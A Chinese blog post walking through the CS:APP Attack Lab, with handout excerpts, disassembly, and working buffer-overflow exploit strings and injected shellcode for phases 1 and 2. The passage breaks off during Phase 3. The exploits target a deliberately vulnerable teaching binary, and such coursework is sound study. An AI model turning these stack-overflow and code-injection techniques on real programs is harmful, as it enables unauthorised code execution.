<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CSAPP的lab3-attacklab, Apollo-213">
    <meta name="description" content="
一个寒假没动,开学了,努努力把Attack Lab开盒了

Part I CI总览
CI: Code Injection Attacks

测试下这个程序
注意我们在执行ctarget程序的时候默认是连接到cmu的服务器，但是我们不是cm">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>CSAPP的lab3-attacklab | Apollo-213</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Apollo-213</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Apollo-213</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CSAPP的lab3-attacklab</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                <span class="chip bg-color">学习笔记</span>
                            </a>
                        
                            <a href="/tags/CSAPP/">
                                <span class="chip bg-color">CSAPP</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CS/" class="post-category">
                                CS
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-02-27
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-02-29
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    6.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    31 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <blockquote>
<p>一个寒假没动,开学了,努努力把Attack Lab开盒了</p>
</blockquote>
<h1 id="Part-I-CI"><a href="#Part-I-CI" class="headerlink" title="Part I CI"></a>Part I CI</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><blockquote>
<p>CI: Code Injection Attacks</p>
</blockquote>
<p>测试下这个程序</p>
<p>注意我们在执行ctarget程序的时候默认是连接到cmu的服务器，但是我们不是cmu的学生所以连不上服务器也就无法执行代码，所以执行的时候要加命令行参数 -q 以阻止连接到服务器的行为。</p>
<p>输入以下命令运行ctarget</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token operator">/</span>ctarget <span class="token operator">-</span>q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>(同理,用gdb ctarget时,要注意run要写成run -q,不然就会试图链接远程服务器,然后报以下错误)</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png" alt="image-20240229000718171"></p>
<p>随意的输入个string得知程序大致运行方式</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png" alt="image-20240229000829319"></p>
<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><p>然后我们在做实验之前一定要看的pdf文档告诉我们以下信息<br>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute<br>an existing procedure.<br>Function getbuf is called within CTARGET by a function test having the following C code:</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> val<span class="token punctuation">;</span>
    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution<br>within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,<br>there is code for a function touch1 having the following C representation:</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    vlevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch!: You called touch1()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,<br>rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly<br>related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.<br>Some Advice:<br>• All the information you need to devise your exploit string for this level can be determined by exam-<br>ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p>
<p>所以我们要把touch1的函数位置来覆盖getbuf的返回值以便执行touch1</p>
<p>先输入查看汇编代码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-d</span> ctarget <span class="token operator">></span>ctarget.s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Getbuf:</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp;
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Touch1:</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">00000000004017c0 &lt;touch1&gt;:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>0x28在十进制下2*16+8&#x3D;40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址的位置(0x5561dca8)覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥</p>
<p>即字节码为:(小端法,逆序存储)</p>
<pre class="line-numbers language-none"><code class="language-none">00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
c0 17 40 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>保存该文件为sol1.txt,然后把这个字节码转化成string,通过hex2raw命令(可以查看pdf文档的附录A),然后可以通过-i进行重定向输入,则完成Phase_1</p>
<p>输入命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./hex2raw <span class="token operator">&lt;</span>sol1.txt <span class="token operator">></span>sol1r.txt
gdb ctarget
run <span class="token parameter variable">-q</span> <span class="token parameter variable">-i</span> sol1r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>观察到以下信息则通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png" alt="image-20240302013522137"></p>
<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><p>照例读一遍官方pdf文档:</p>
<p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function <strong>touch2</strong> having the following C representation:</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">/* Part of validation protocol */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.<code>你的任务是让CTARGET执行touch2的代码，而不是返回测试。但是，在这种情况下，您必须使它看起来像touch2一样，就像您已将cookie作为其参数传递一样。</code></p>
<p>Some Advice:<br>• You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.<code>您将希望以这样一种方式定位注入代码的地址的字节表示形式，即getbuf代码末尾的ret指令将控制权转移给它。</code><br>• Recall that the first argument to a function is passed in register %rdi.<code>回想一下，函数的第一个参数是在寄存器 % rdi中传递的。</code><br>• Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.<code>您注入的代码应将寄存器设置为您的cookie，然后使用ret指令将控制权转移到touch2中的第一个指令。</code><br>• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.<code>不要尝试在漏洞利用代码中使用jmp或调用指令。这些指令的目的地地址的编码难以公式化。对所有控制权转移使用ret指令，即使您没有从呼叫中返回。</code><br>• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequence<code>请参阅附录b中有关如何使用工具生成指令序列的字节级表示的讨论</code></p>
<p>touch2</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">00000000004017ec &lt;touch2&gt;:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;
  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;
  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以我要做的应该是把%rdi中的值变成cookie的值,这样在比较时便会通过.</p>
<p>知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。这时%rsp不会变化(如果没有其它命令的话)</p>
<p>需完成操作:</p>
<ul>
<li><p>将cookie(0x59b997fa中的值推送到%rdi中</p>
</li>
<li><p>将touch2的地址push到栈中</p>
</li>
<li><p>ret,取到touch2的地址</p>
</li>
</ul>
<p>根据以上操作写出汇编代码,保存该代码为t2.s文件</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov $0x59b997fa, %rdi
pushq $0x4017ec
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>接下来我们要得到机器代码(编译再反汇编得到机器代码指令)</p>
<p>输入以下指令</p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c -Og t2.s
objdump -d t2.o&gt;t2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可以得到汇编代码的机器指令:</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png" alt="image-20240302014356466"></p>
<p>然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令,打一个在getbuf的断点,探测到rsp的地址,即栈顶地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png" alt="image-20240229135832513"></p>
<pre class="line-numbers language-none"><code class="language-none">p $rsp&#x3D;0x5561dc78<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样我们就可以开始编我们的进攻序列,在缓冲区中存放进攻指令,覆盖的地址填原来的栈顶,即在0x5561dc78注入代码进行进攻</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png" alt="image-20240302014950119"></p>
<p>覆盖的地址要依照小端法逆序,而机器指令不用逆序,中间填充字符,当然可以考虑换一个代码注入位置.编完后我们要用hex2raw来转换进攻字节以便于生成进攻字符串</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol2.txt&gt;sol2r.txt
.&#x2F;ctarget -q -i sol2r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后提交会得到以下结果,圆满过关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png" alt="image-20240302014929043"></p>
<p>或者我们可以选择不在那里注入代码,我们选择在test的栈帧内注入代码,即在0x5561dca8段注入代码!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png" alt="image-20240302015226085"></p>
<p>理论成立,实践开始!</p>
<p>圆满通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png" alt="image-20240302015316019"></p>
<h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h2><p>看一下官方文档:</p>
<p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p>
<p>touch3 C &amp;&amp; Assembly Code:</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> \<span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">/*Part of validation protocol */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token number">00000000004018f</span>a <span class="token operator">&lt;</span>touch3<span class="token operator">></span><span class="token operator">:</span>
  <span class="token number">4018f</span>a<span class="token operator">:</span>	<span class="token number">53</span>                   	push   <span class="token operator">%</span>rbx
  <span class="token number">4018f</span>b<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> fb             	mov    <span class="token operator">%</span>rdi<span class="token punctuation">,</span><span class="token operator">%</span>rbx
  <span class="token number">4018f</span>e<span class="token operator">:</span>	c7 <span class="token number">05</span> d4 <span class="token number">2</span>b <span class="token number">20</span> <span class="token number">00</span> <span class="token number">03</span> 	movl   $<span class="token number">0x3</span><span class="token punctuation">,</span><span class="token number">0x202bd4</span><span class="token punctuation">(</span><span class="token operator">%</span>rip<span class="token punctuation">)</span>        # <span class="token number">6044</span>dc <span class="token operator">&lt;</span>vlevel<span class="token operator">></span>
  <span class="token number">401905</span><span class="token operator">:</span>	<span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> 
  <span class="token number">401908</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> fe             	mov    <span class="token operator">%</span>rdi<span class="token punctuation">,</span><span class="token operator">%</span>rsi
  <span class="token number">40190</span>b<span class="token operator">:</span>	<span class="token number">8</span>b <span class="token number">3</span>d d3 <span class="token number">2</span>b <span class="token number">20</span> <span class="token number">00</span>    	mov    <span class="token number">0x202bd3</span><span class="token punctuation">(</span><span class="token operator">%</span>rip<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>edi        # <span class="token number">6044e4</span> <span class="token operator">&lt;</span>cookie<span class="token operator">></span>
  <span class="token number">401911</span><span class="token operator">:</span>	e8 <span class="token number">36</span> ff ff ff       	callq  <span class="token number">40184</span>c <span class="token operator">&lt;</span>hexmatch<span class="token operator">></span>
  <span class="token number">401916</span><span class="token operator">:</span>	<span class="token number">85</span> c0                	test   <span class="token operator">%</span>eax<span class="token punctuation">,</span><span class="token operator">%</span>eax
  <span class="token number">401918</span><span class="token operator">:</span>	<span class="token number">74</span> <span class="token number">23</span>                	je     <span class="token number">40193</span>d <span class="token operator">&lt;</span>touch3<span class="token operator">+</span><span class="token number">0x43</span><span class="token operator">></span>
  <span class="token number">40191</span>a<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> da             	mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rdx
  <span class="token number">40191</span>d<span class="token operator">:</span>	be <span class="token number">38</span> <span class="token number">31</span> <span class="token number">40</span> <span class="token number">00</span>       	mov    $<span class="token number">0x403138</span><span class="token punctuation">,</span><span class="token operator">%</span>esi
  <span class="token number">401922</span><span class="token operator">:</span>	bf <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x1</span><span class="token punctuation">,</span><span class="token operator">%</span>edi
